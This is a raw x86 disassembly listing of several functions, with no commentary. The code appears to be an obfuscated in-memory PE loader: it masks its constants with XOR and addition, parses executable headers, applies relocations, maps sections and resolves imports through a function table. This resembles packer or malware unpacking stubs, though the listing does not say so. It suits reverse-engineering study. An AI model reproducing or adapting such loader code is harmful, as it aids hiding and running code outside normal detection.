  41e819:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41e820:	mov    eax,DWORD PTR [ebp-0x4]
  41e823:	mov    ecx,DWORD PTR [ebp-0x4]
  41e826:	mov    ecx,DWORD PTR [ebp-0x4]
  41e829:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82c:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82f:	mov    ecx,DWORD PTR [ebp-0x4]
  41e832:	push   ebx
  41e833:	mov    ebx,DWORD PTR [ebp+0x10]
  41e836:	push   esi
  41e837:	mov    esi,0x751089b
  41e83c:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41e843:	mov    ecx,DWORD PTR [ebp-0x4]
  41e846:	mov    ebx,DWORD PTR [ebx+0x190]
  41e84c:	push   edi
  41e84d:	mov    edi,0x3272e2
  41e852:	xor    ecx,esi
  41e854:	xor    eax,esi
  41e856:	add    eax,edi
  41e858:	add    ecx,edi
  41e85a:	mov    DWORD PTR [ebp-0x18],eax
  41e85d:	cmp    ecx,DWORD PTR [ebx]
  41e85f:	je     0x41eae0
  41e865:	mov    ebx,DWORD PTR [ebp-0x4]
  41e868:	mov    ecx,DWORD PTR [ebp+0xc]
  41e86b:	xor    ebx,esi
  41e86d:	add    ebx,edi
  41e86f:	cmp    ebx,ecx
  41e871:	je     0x41eae0
  41e877:	mov    ebx,DWORD PTR [ebp-0x4]
  41e87a:	mov    ecx,DWORD PTR [ecx+0x80]
  41e880:	xor    ebx,esi
  41e882:	add    ebx,edi
  41e884:	cmp    ecx,ebx
  41e886:	je     0x41eadb
  41e88c:	add    ecx,DWORD PTR [ebp+0x8]
  41e88f:	mov    DWORD PTR [ebp-0x2c],ecx
  41e892:	mov    ebx,edx
  41e894:	xor    ebx,esi
  41e896:	add    ebx,edi
  41e898:	mov    DWORD PTR [ebp-0x10],ebx
  41e89b:	mov    ebx,DWORD PTR [ebp-0x10]
  41e89e:	cmp    ebx,edx
  41e8a0:	je     0x41e8b4
  41e8a2:	mov    edx,DWORD PTR [ebp-0x10]
  41e8a5:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8a8:	imul   edx,edx,0x14
  41e8ab:	xor    ebx,esi
  41e8ad:	add    ebx,edi
  41e8af:	cmp    DWORD PTR [edx+ecx*1],ebx
  41e8b2:	jne    0x41e8cb
  41e8b4:	mov    edx,DWORD PTR [ebp-0x10]
  41e8b7:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8ba:	imul   edx,edx,0x14
  41e8bd:	xor    ebx,esi
  41e8bf:	add    ebx,edi
  41e8c1:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41e8c5:	je     0x41eacd
  41e8cb:	mov    eax,DWORD PTR [ebp-0x4]
  41e8ce:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8d1:	mov    eax,DWORD PTR [ebp-0x10]
  41e8d4:	imul   eax,eax,0x14
  41e8d7:	add    eax,ecx
  41e8d9:	mov    ecx,DWORD PTR [eax+0x10]
  41e8dc:	add    ecx,DWORD PTR [ebp+0x8]
  41e8df:	xor    ebx,esi
  41e8e1:	mov    DWORD PTR [ebp-0x1c],ecx
  41e8e4:	mov    ecx,DWORD PTR [ebp-0x4]
  41e8e7:	mov    edx,DWORD PTR [ebp-0x4]
  41e8ea:	xor    ecx,esi
  41e8ec:	add    ecx,edi
  41e8ee:	xor    edx,esi
  41e8f0:	mov    DWORD PTR [ebp-0x24],ecx
  41e8f3:	mov    ecx,DWORD PTR [eax]
  41e8f5:	add    edx,edi
  41e8f7:	add    ebx,edi
  41e8f9:	cmp    ecx,edx
  41e8fb:	je     0x41e903
  41e8fd:	add    ecx,DWORD PTR [ebp+0x8]
  41e900:	mov    DWORD PTR [ebp-0x24],ecx
  41e903:	mov    ecx,DWORD PTR [ebp-0x4]
  41e906:	xor    ecx,esi
  41e908:	add    ecx,DWORD PTR [eax+0xc]
  41e90b:	mov    eax,DWORD PTR [ebp+0x8]
  41e90e:	lea    eax,[ecx+eax*1+0x3272e2]
  41e915:	mov    DWORD PTR [ebp+0xc],eax
  41e918:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41e91f:	mov    eax,DWORD PTR [ebp+0x10]
  41e922:	push   DWORD PTR [ebp+0xc]
  41e925:	mov    eax,DWORD PTR [eax+0x1d8]
  41e92b:	call   DWORD PTR [eax]
  41e92d:	mov    ecx,DWORD PTR [ebp-0x4]
  41e930:	xor    ecx,esi
  41e932:	add    ecx,edi
  41e934:	mov    DWORD PTR [ebp-0xc],eax
  41e937:	cmp    ecx,eax
  41e939:	jne    0x41e94d
  41e93b:	mov    eax,DWORD PTR [ebp+0x10]
  41e93e:	push   DWORD PTR [ebp+0xc]
  41e941:	mov    eax,DWORD PTR [eax+0x1d8]
  41e947:	call   DWORD PTR [eax+0xc]
  41e94a:	mov    DWORD PTR [ebp-0xc],eax
  41e94d:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  41e954:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  41e95b:	mov    eax,DWORD PTR [ebp-0x4]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    eax,DWORD PTR [ebp-0xc]
  41e965:	jne    0x41e98a
  41e967:	mov    eax,DWORD PTR [ebp-0x8]
  41e96a:	mov    ecx,DWORD PTR [ebp-0x20]
  41e96d:	xor    eax,esi
  41e96f:	xor    ecx,esi
  41e971:	lea    ebx,[ebx+eax*1+0x3272e2]
  41e978:	mov    eax,DWORD PTR [ebp+0x10]
  41e97b:	mov    eax,DWORD PTR [eax+0x1d8]
  41e981:	add    ecx,edi
  41e983:	imul   ecx,ebx
  41e986:	push   ecx
  41e987:	call   DWORD PTR [eax+0x24]
  41e98a:	mov    eax,DWORD PTR [ebp-0x4]
  41e98d:	xor    eax,esi
  41e98f:	add    eax,edi
  41e991:	cmp    eax,DWORD PTR [ebp-0xc]
  41e994:	jne    0x41e9a5
  41e996:	mov    eax,DWORD PTR [ebp-0x28]
  41e999:	xor    eax,esi
  41e99b:	add    eax,edi
  41e99d:	cmp    ebx,eax
  41e99f:	jbe    0x41e91f
  41e9a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e9a8:	xor    eax,esi
  41e9aa:	add    eax,edi
  41e9ac:	cmp    eax,DWORD PTR [ebp-0xc]
  41e9af:	jne    0x41e9c8
  41e9b1:	mov    eax,DWORD PTR [ebp-0x8]
  41e9b4:	mov    ecx,DWORD PTR [ebp-0x18]
  41e9b7:	xor    eax,esi
  41e9b9:	lea    eax,[ecx+eax*1+0x3272e2]
  41e9c0:	mov    DWORD PTR [ebp-0x18],eax
  41e9c3:	jmp    0x41eab7
  41e9c8:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  41e9cf:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41e9d6:	mov    ebx,DWORD PTR [ebp-0x4]
  41e9d9:	xor    ebx,esi
  41e9db:	add    ebx,edi
  41e9dd:	jmp    0x41eaa4
  41e9e2:	mov    eax,DWORD PTR [ebp-0x4]
  41e9e5:	xor    eax,esi
  41e9e7:	add    eax,edi
  41e9e9:	mov    DWORD PTR [ebp-0x14],eax
  41e9ec:	mov    eax,DWORD PTR [ebp-0x4]
  41e9ef:	xor    eax,esi
  41e9f1:	add    eax,edi
  41e9f3:	mov    DWORD PTR [ebp+0xc],eax
  41e9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41e9f9:	mov    eax,DWORD PTR [ebp-0x24]
  41e9fc:	xor    ecx,esi
  41e9fe:	add    ecx,edi
  41ea00:	cmp    ecx,eax
  41ea02:	je     0x41ea0a
  41ea04:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea07:	mov    DWORD PTR [ebp-0x14],eax
  41ea0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ea0d:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea10:	mov    DWORD PTR [ebp+0xc],eax
  41ea13:	mov    eax,DWORD PTR [ebp-0x4]
  41ea16:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea19:	xor    eax,esi
  41ea1b:	add    eax,edi
  41ea1d:	cmp    eax,ecx
  41ea1f:	je     0x41ea4a
  41ea21:	mov    eax,DWORD PTR [ebp-0x4]
  41ea24:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea27:	xor    eax,esi
  41ea29:	add    eax,edi
  41ea2b:	shr    ecx,0x1f
  41ea2e:	cmp    eax,ecx
  41ea30:	je     0x41ea4a
  41ea32:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea35:	mov    eax,DWORD PTR [ebp+0x10]
  41ea38:	mov    eax,DWORD PTR [eax+0x1d8]
  41ea3e:	movzx  ecx,cx
  41ea41:	push   ecx
  41ea42:	push   DWORD PTR [ebp-0xc]
  41ea45:	call   DWORD PTR [eax+0x8]
  41ea48:	jmp    0x41ea63
  41ea4a:	mov    eax,DWORD PTR [ebp+0xc]
  41ea4d:	add    eax,DWORD PTR [ebp+0x8]
  41ea50:	mov    ecx,DWORD PTR [ebp+0x10]
  41ea53:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ea59:	add    eax,0x2
  41ea5c:	push   eax
  41ea5d:	push   DWORD PTR [ebp-0xc]
  41ea60:	call   DWORD PTR [ecx+0x8]
  41ea63:	mov    DWORD PTR [ebp+0xc],eax
  41ea66:	mov    eax,DWORD PTR [ebp-0x4]
  41ea69:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea6c:	xor    eax,esi
  41ea6e:	add    eax,edi
  41ea70:	cmp    eax,ecx
  41ea72:	mov    eax,DWORD PTR [ebp-0x8]
  41ea75:	jne    0x41ea88
  41ea77:	mov    ecx,DWORD PTR [ebp-0x18]
  41ea7a:	xor    eax,esi
  41ea7c:	lea    eax,[ecx+eax*1+0x3272e2]
  41ea83:	mov    DWORD PTR [ebp-0x18],eax
  41ea86:	jmp    0x41ea98
  41ea88:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea8b:	xor    eax,esi
  41ea8d:	add    eax,edi
  41ea8f:	imul   eax,ecx
  41ea92:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ea95:	mov    DWORD PTR [ecx+ebx*4],eax
  41ea98:	mov    eax,DWORD PTR [ebp-0x8]
  41ea9b:	xor    eax,esi
  41ea9d:	lea    ebx,[ebx+eax*1+0x3272e2]
  41eaa4:	mov    eax,DWORD PTR [ebp-0x4]
  41eaa7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41eaaa:	xor    eax,esi
  41eaac:	add    eax,edi
  41eaae:	cmp    DWORD PTR [ecx+ebx*4],eax
  41eab1:	jne    0x41e9e2
  41eab7:	mov    edx,DWORD PTR [ebp-0x10]
  41eaba:	mov    eax,DWORD PTR [ebp-0x18]
  41eabd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41eac0:	sub    edx,0x3272e1
  41eac6:	xor    edx,esi
  41eac8:	jmp    0x41e892
  41eacd:	mov    ecx,DWORD PTR [ebp-0x4]
  41ead0:	xor    ecx,esi
  41ead2:	add    ecx,edi
  41ead4:	cmp    eax,ecx
  41ead6:	mov    eax,DWORD PTR [ebp-0x4]
  41ead9:	jne    0x41eae3
  41eadb:	mov    eax,DWORD PTR [ebp-0x8]
  41eade:	jmp    0x41eae3
  41eae0:	mov    eax,DWORD PTR [ebp-0x4]
  41eae3:	xor    eax,esi
  41eae5:	add    eax,edi
  41eae7:	pop    edi
  41eae8:	pop    esi
  41eae9:	pop    ebx
  41eaea:	leave  
  41eaeb:	ret    0xc
  41eaee:	push   ebp
  41eaef:	mov    ebp,esp
  41eaf1:	sub    esp,0x28
  41eaf4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41eafb:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  41eb02:	mov    eax,DWORD PTR [ebp+0xc]
  41eb05:	mov    DWORD PTR [ebp+0xc],eax
  41eb08:	push   esi
  41eb09:	mov    eax,eax
  41eb0b:	mov    eax,DWORD PTR [ebp-0x4]
  41eb0e:	mov    esi,DWORD PTR [ebp+0x8]
  41eb11:	mov    ecx,0x751089b
  41eb16:	xor    eax,ecx
  41eb18:	mov    edx,0x3272e2
  41eb1d:	add    eax,edx
  41eb1f:	cmp    esi,eax
  41eb21:	je     0x41ec48
  41eb27:	mov    eax,DWORD PTR [ebp+0x8]
  41eb2a:	mov    esi,DWORD PTR [ebp+0x8]
  41eb2d:	add    esi,DWORD PTR [eax+0x3c]
  41eb30:	push   edi
  41eb31:	mov    DWORD PTR [ebp+0xc],esi
  41eb34:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  41eb3b:	mov    eax,DWORD PTR [ebp-0x1c]
  41eb3e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb41:	mov    edi,DWORD PTR [ebp+0xc]
  41eb44:	xor    esi,ecx
  41eb46:	xor    eax,ecx
  41eb48:	add    esi,edx
  41eb4a:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  41eb51:	je     0x41ec42
  41eb57:	mov    esi,DWORD PTR [ebp+0xc]
  41eb5a:	mov    eax,DWORD PTR [ebp+0x8]
  41eb5d:	add    eax,DWORD PTR [esi+0xa0]
  41eb63:	mov    esi,DWORD PTR [ebp+0x8]
  41eb66:	mov    edi,DWORD PTR [ebp+0xc]
  41eb69:	sub    esi,DWORD PTR [edi+0x34]
  41eb6c:	mov    edi,DWORD PTR [ebp-0x4]
  41eb6f:	xor    edi,ecx
  41eb71:	add    edi,edx
  41eb73:	mov    DWORD PTR [ebp-0x24],esi
  41eb76:	cmp    esi,edi
  41eb78:	je     0x41ec42
  41eb7e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb81:	xor    esi,ecx
  41eb83:	add    esi,edx
  41eb85:	mov    DWORD PTR [ebp-0x8],esi
  41eb88:	push   ebx
  41eb89:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41eb90:	jmp    0x41ec2c
  41eb95:	mov    esi,DWORD PTR [ebp-0x4]
  41eb98:	xor    esi,ecx
  41eb9a:	lea    edi,[ebx-0x8]
  41eb9d:	add    esi,edx
  41eb9f:	shr    edi,1
  41eba1:	cmp    esi,edi
  41eba3:	jae    0x41ec12
  41eba5:	sub    edi,esi
  41eba7:	lea    ebx,[eax+esi*2+0x8]
  41ebab:	mov    DWORD PTR [ebp-0x18],edi
  41ebae:	movzx  esi,WORD PTR [ebx]
  41ebb1:	and    esi,0xfff
  41ebb7:	mov    DWORD PTR [ebp-0x14],esi
  41ebba:	mov    edi,DWORD PTR [ebp-0x14]
  41ebbd:	mov    esi,DWORD PTR [eax]
  41ebbf:	sub    esi,edx
  41ebc1:	add    edi,esi
  41ebc3:	movzx  esi,WORD PTR [ebx]
  41ebc6:	shr    esi,0xc
  41ebc9:	xor    edi,ecx
  41ebcb:	mov    DWORD PTR [ebp-0x20],edi
  41ebce:	mov    DWORD PTR [ebp-0x14],esi
  41ebd1:	mov    esi,DWORD PTR [ebp-0x20]
  41ebd4:	mov    edi,DWORD PTR [ebp+0x8]
  41ebd7:	xor    esi,ecx
  41ebd9:	lea    esi,[esi+edi*1+0x3272e2]
  41ebe0:	mov    DWORD PTR [ebp-0x20],esi
  41ebe3:	mov    esi,DWORD PTR [ebp-0x10]
  41ebe6:	mov    edi,DWORD PTR [ebp-0x14]
  41ebe9:	xor    esi,ecx
  41ebeb:	add    esi,edx
  41ebed:	cmp    edi,esi
  41ebef:	jne    0x41ec07
  41ebf1:	mov    esi,DWORD PTR [ebp-0x10]
  41ebf4:	mov    edi,DWORD PTR [ebp-0x14]
  41ebf7:	xor    esi,ecx
  41ebf9:	add    esi,edx
  41ebfb:	cmp    edi,esi
  41ebfd:	jne    0x41ec07
  41ebff:	mov    esi,DWORD PTR [ebp-0x20]
  41ec02:	mov    edi,DWORD PTR [ebp-0x24]
  41ec05:	add    DWORD PTR [esi],edi
  41ec07:	add    ebx,0x2
  41ec0a:	dec    DWORD PTR [ebp-0x18]
  41ec0d:	jne    0x41ebae
  41ec0f:	mov    ebx,DWORD PTR [ebp-0xc]
  41ec12:	add    DWORD PTR [ebp-0x8],ebx
  41ec15:	mov    esi,DWORD PTR [ebp-0x1c]
  41ec18:	mov    edi,DWORD PTR [ebp-0x8]
  41ec1b:	mov    ebx,DWORD PTR [ebp+0xc]
  41ec1e:	xor    esi,ecx
  41ec20:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41ec27:	jae    0x41ec41
  41ec29:	add    eax,DWORD PTR [ebp-0xc]
  41ec2c:	mov    esi,DWORD PTR [ebp-0x4]
  41ec2f:	mov    ebx,DWORD PTR [eax+0x4]
  41ec32:	xor    esi,ecx
  41ec34:	add    esi,edx
  41ec36:	mov    DWORD PTR [ebp-0xc],ebx
  41ec39:	cmp    ebx,esi
  41ec3b:	jne    0x41eb95
  41ec41:	pop    ebx
  41ec42:	mov    eax,DWORD PTR [ebp-0x28]
  41ec45:	pop    edi
  41ec46:	jmp    0x41ec4b
  41ec48:	mov    eax,DWORD PTR [ebp-0x4]
  41ec4b:	xor    eax,ecx
  41ec4d:	add    eax,edx
  41ec4f:	pop    esi
  41ec50:	leave  
  41ec51:	ret    0x8
  41ec54:	push   ebp
  41ec55:	mov    ebp,esp
  41ec57:	sub    esp,0xcc
  41ec5d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41ec64:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  41ec6b:	mov    eax,DWORD PTR [ebp-0x4]
  41ec6e:	push   ebx
  41ec6f:	push   esi
  41ec70:	mov    esi,0x751089b
  41ec75:	xor    eax,esi
  41ec77:	push   edi
  41ec78:	mov    edi,0x3272e2
  41ec7d:	add    eax,edi
  41ec7f:	mov    DWORD PTR [ebp-0x1c],eax
  41ec82:	mov    eax,DWORD PTR [ebp-0x4]
  41ec85:	xor    eax,esi
  41ec87:	add    eax,edi
  41ec89:	mov    DWORD PTR [ebp-0x8],eax
  41ec8c:	mov    ebx,DWORD PTR [ebp+0x20]
  41ec8f:	mov    eax,DWORD PTR [ebp-0x14]
  41ec92:	mov    ecx,DWORD PTR [ebp-0x14]
  41ec95:	xor    eax,ecx
  41ec97:	mov    DWORD PTR [ebp-0x14],eax
  41ec9a:	add    DWORD PTR [ebp-0x14],0xf89cb585
  41eca1:	mov    eax,DWORD PTR [ebp-0xc]
  41eca4:	mov    ecx,DWORD PTR [ebp-0xc]
  41eca7:	xor    eax,ecx
  41eca9:	mov    DWORD PTR [ebp-0xc],eax
  41ecac:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41ecb3:	mov    eax,DWORD PTR [ebp-0x10]
  41ecb6:	mov    ecx,DWORD PTR [ebp-0x10]
  41ecb9:	xor    eax,ecx
  41ecbb:	mov    DWORD PTR [ebp-0x10],eax
  41ecbe:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41ecc5:	mov    eax,DWORD PTR [ebp-0x20]
  41ecc8:	mov    ecx,DWORD PTR [ebp-0x20]
  41eccb:	xor    eax,ecx
  41eccd:	mov    DWORD PTR [ebp-0x20],eax
  41ecd0:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41ecd7:	mov    eax,0x9471
  41ecdc:	mov    WORD PTR [ebp+0x20],ax
  41ece0:	mov    eax,DWORD PTR [ebp+0x8]
  41ece3:	test   eax,eax
  41ece5:	je     0x41f140
  41eceb:	mov    eax,DWORD PTR [ebp+0xc]
  41ecee:	test   eax,eax
  41ecf0:	je     0x41f140
  41ecf6:	mov    eax,DWORD PTR [ebp+0x18]
  41ecf9:	test   eax,eax
  41ecfb:	je     0x41f140
  41ed01:	mov    ax,WORD PTR [ebp+0x20]
  41ed05:	mov    ecx,0x8a8d
  41ed0a:	xor    ax,cx
  41ed0d:	mov    ecx,0x3b51
  41ed12:	add    ax,cx
  41ed15:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed18:	cmp    WORD PTR [ecx],ax
  41ed1b:	jne    0x41f140
  41ed21:	mov    eax,DWORD PTR [ebp-0x4]
  41ed24:	xor    eax,esi
  41ed26:	add    eax,edi
  41ed28:	mov    DWORD PTR [ebp-0x30],eax
  41ed2b:	mov    eax,DWORD PTR [ebp-0x4]
  41ed2e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed31:	mov    eax,DWORD PTR [ebp+0x8]
  41ed34:	add    eax,DWORD PTR [ecx+0x3c]
  41ed37:	mov    DWORD PTR [ebp+0xc],eax
  41ed3a:	mov    eax,DWORD PTR [eax+0x50]
  41ed3d:	test   eax,eax
  41ed3f:	je     0x41f140
  41ed45:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  41ed4c:	mov    eax,DWORD PTR [ebp-0x2c]
  41ed4f:	xor    eax,esi
  41ed51:	add    eax,edi
  41ed53:	mov    DWORD PTR [ebp-0x2c],eax
  41ed56:	mov    eax,DWORD PTR [ebp-0x4]
  41ed59:	mov    eax,DWORD PTR [ebx+0x190]
  41ed5f:	mov    ecx,DWORD PTR [eax]
  41ed61:	mov    ecx,DWORD PTR [ecx+0x3c]
  41ed64:	add    ecx,DWORD PTR [eax]
  41ed66:	mov    eax,DWORD PTR [ebp-0x4]
  41ed69:	mov    eax,DWORD PTR [ebx+0x18c]
  41ed6f:	mov    edx,DWORD PTR [eax]
  41ed71:	mov    DWORD PTR [ebp-0x18],ecx
  41ed74:	mov    DWORD PTR [ebp+0x20],edx
  41ed77:	cmp    edx,edx
  41ed79:	jne    0x41edad
  41ed7b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ed81:	lea    edx,[ebp-0x1c]
  41ed84:	push   edx
  41ed85:	mov    edx,DWORD PTR [ebp-0xc]
  41ed88:	xor    edx,esi
  41ed8a:	add    edx,edi
  41ed8c:	push   edx
  41ed8d:	push   DWORD PTR [ecx+0x50]
  41ed90:	push   DWORD PTR [ebp+0x20]
  41ed93:	call   DWORD PTR [eax+0x1c]
  41ed96:	mov    eax,DWORD PTR [ebp-0x18]
  41ed99:	mov    ecx,DWORD PTR [eax+0x54]
  41ed9c:	mov    eax,DWORD PTR [eax+0x50]
  41ed9f:	sub    eax,ecx
  41eda1:	add    ecx,DWORD PTR [ebp+0x20]
  41eda4:	push   ecx
  41eda5:	call   0x41f72c
  41edaa:	mov    edx,DWORD PTR [ebp+0x20]
  41edad:	mov    eax,DWORD PTR [ebx+0x194]
  41edb3:	mov    DWORD PTR [eax],edx
  41edb5:	mov    eax,DWORD PTR [ebp+0xc]
  41edb8:	push   DWORD PTR [eax+0x54]
  41edbb:	push   DWORD PTR [ebp+0x8]
  41edbe:	push   edx
  41edbf:	call   0x41f5d3
  41edc4:	mov    ecx,DWORD PTR [ebp+0x20]
  41edc7:	mov    eax,DWORD PTR [ecx+0x3c]
  41edca:	add    eax,ecx
  41edcc:	movzx  ecx,WORD PTR [eax+0x14]
  41edd0:	lea    ecx,[ecx+eax*1+0x18]
  41edd4:	mov    DWORD PTR [ebp+0x18],ecx
  41edd7:	mov    ecx,DWORD PTR [ebp-0x4]
  41edda:	movzx  edx,WORD PTR [eax+0x6]
  41edde:	xor    ecx,esi
  41ede0:	add    ecx,edi
  41ede2:	mov    DWORD PTR [ebp+0xc],eax
  41ede5:	cmp    edx,ecx
  41ede7:	je     0x41ee94
  41eded:	mov    ecx,DWORD PTR [ebp-0x4]
  41edf0:	xor    ecx,esi
  41edf2:	add    ecx,edi
  41edf4:	mov    DWORD PTR [ebp-0x8],ecx
  41edf7:	mov    ecx,DWORD PTR [ebp-0x24]
  41edfa:	movzx  edx,WORD PTR [eax+0x6]
  41edfe:	xor    ecx,esi
  41ee00:	sub    edx,ecx
  41ee02:	sub    edx,edi
  41ee04:	cmp    DWORD PTR [ebp-0x8],edx
  41ee07:	ja     0x41ee94
  41ee0d:	mov    edx,DWORD PTR [ebp+0x18]
  41ee10:	add    edx,0x8
  41ee13:	mov    DWORD PTR [ebp+0x18],edx
  41ee16:	jmp    0x41ee1b
  41ee18:	mov    edx,DWORD PTR [ebp+0x18]
  41ee1b:	mov    eax,DWORD PTR [eax+0x38]
  41ee1e:	lea    ecx,[eax-0x1]
  41ee21:	mov    DWORD PTR [ebp-0x34],eax
  41ee24:	mov    eax,DWORD PTR [edx]
  41ee26:	test   ecx,eax
  41ee28:	je     0x41ee31
  41ee2a:	not    ecx
  41ee2c:	and    eax,ecx
  41ee2e:	add    eax,DWORD PTR [ebp-0x34]
  41ee31:	mov    ecx,DWORD PTR [edx+0x4]
  41ee34:	add    ecx,DWORD PTR [ebp+0x20]
  41ee37:	push   ecx
  41ee38:	call   0x41f72c
  41ee3d:	mov    edx,DWORD PTR [ebp-0x4]
  41ee40:	mov    eax,DWORD PTR [ebp+0x18]
  41ee43:	mov    ecx,DWORD PTR [eax+0x8]
  41ee46:	xor    edx,esi
  41ee48:	add    edx,edi
  41ee4a:	cmp    ecx,edx
  41ee4c:	je     0x41ee65
  41ee4e:	push   ecx
  41ee4f:	mov    ecx,DWORD PTR [ebp+0x8]
  41ee52:	add    ecx,DWORD PTR [eax+0xc]
  41ee55:	mov    eax,DWORD PTR [eax+0x4]
  41ee58:	add    eax,DWORD PTR [ebp+0x20]
  41ee5b:	push   ecx
  41ee5c:	push   eax
  41ee5d:	call   0x41f5d3
  41ee62:	mov    eax,DWORD PTR [ebp+0x18]
  41ee65:	mov    ecx,DWORD PTR [ebp-0x24]
  41ee68:	mov    edx,DWORD PTR [ebp-0x8]
  41ee6b:	add    eax,0x28
  41ee6e:	xor    ecx,esi
  41ee70:	lea    ecx,[edx+ecx*1+0x3272e2]
  41ee77:	mov    edx,DWORD PTR [ebp+0xc]
  41ee7a:	mov    DWORD PTR [ebp+0x18],eax
  41ee7d:	mov    eax,DWORD PTR [ebp-0x24]
  41ee80:	movzx  edx,WORD PTR [edx+0x6]
  41ee84:	xor    eax,esi
  41ee86:	sub    edx,eax
  41ee88:	mov    eax,DWORD PTR [ebp+0xc]
  41ee8b:	sub    edx,edi
  41ee8d:	mov    DWORD PTR [ebp-0x8],ecx
  41ee90:	cmp    ecx,edx
  41ee92:	jbe    0x41ee18
  41ee94:	mov    edx,DWORD PTR [ebx+0x18c]
  41ee9a:	mov    ecx,DWORD PTR [ebp+0x20]
  41ee9d:	cmp    ecx,DWORD PTR [edx]
  41ee9f:	jne    0x41eec8
  41eea1:	mov    eax,DWORD PTR [ebx+0x1d8]
  41eea7:	lea    edx,[ebp-0x1c]
  41eeaa:	push   edx
  41eeab:	mov    edx,DWORD PTR [ebp-0x10]
  41eeae:	xor    edx,esi
  41eeb0:	add    edx,edi
  41eeb2:	push   edx
  41eeb3:	mov    edx,DWORD PTR [ebp-0x18]
  41eeb6:	push   DWORD PTR [edx+0x54]
  41eeb9:	push   ecx
  41eeba:	call   DWORD PTR [eax+0x1c]
  41eebd:	test   eax,eax
  41eebf:	je     0x41f131
  41eec5:	mov    eax,DWORD PTR [ebp+0xc]
  41eec8:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41eece:	mov    ecx,DWORD PTR [ecx]
  41eed0:	xor    ecx,esi
  41eed2:	add    ecx,edi
  41eed4:	je     0x41f05c
  41eeda:	and    DWORD PTR [ebp-0x28],0x0
  41eede:	and    DWORD PTR [ebp+0x8],0x0
  41eee2:	mov    eax,0xf89c8519
  41eee7:	lea    ecx,[eax-0x8]
  41eeea:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41eef1:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41eef8:	mov    DWORD PTR [ebp-0x44],eax
  41eefb:	mov    DWORD PTR [ebp-0x40],ecx
  41eefe:	mov    DWORD PTR [ebp-0x3c],ecx
  41ef01:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41ef08:	mov    edx,DWORD PTR [ebp+0x8]
  41ef0b:	mov    ecx,0x89b
  41ef10:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41ef15:	mov    edx,0x72e2
  41ef1a:	add    cx,dx
  41ef1d:	mov    edx,DWORD PTR [ebp+0x8]
  41ef20:	inc    DWORD PTR [ebp+0x8]
  41ef23:	cmp    DWORD PTR [ebp+0x8],0x6
  41ef27:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41ef2f:	jb     0x41ef08
  41ef31:	mov    ecx,0xf89c850b
  41ef36:	mov    DWORD PTR [ebp-0xa4],eax
  41ef3c:	mov    DWORD PTR [ebp-0x90],eax
  41ef42:	mov    DWORD PTR [ebp-0x68],eax
  41ef45:	mov    DWORD PTR [ebp-0x64],eax
  41ef48:	lea    eax,[ecx-0x1]
  41ef4b:	mov    edx,0xf89c85ff
  41ef50:	mov    DWORD PTR [ebp-0x58],eax
  41ef53:	mov    DWORD PTR [ebp-0x54],eax
  41ef56:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  41ef60:	mov    DWORD PTR [ebp-0xa0],ecx
  41ef66:	mov    DWORD PTR [ebp-0x9c],edx
  41ef6c:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  41ef76:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ef80:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  41ef8a:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ef94:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  41ef9e:	mov    DWORD PTR [ebp-0x80],ecx
  41efa1:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41efa8:	mov    DWORD PTR [ebp-0x78],edx
  41efab:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41efb2:	mov    DWORD PTR [ebp-0x70],ecx
  41efb5:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  41efbc:	mov    DWORD PTR [ebp-0x60],ecx
  41efbf:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41efc6:	mov    DWORD PTR [ebp-0x50],0xf89c8585
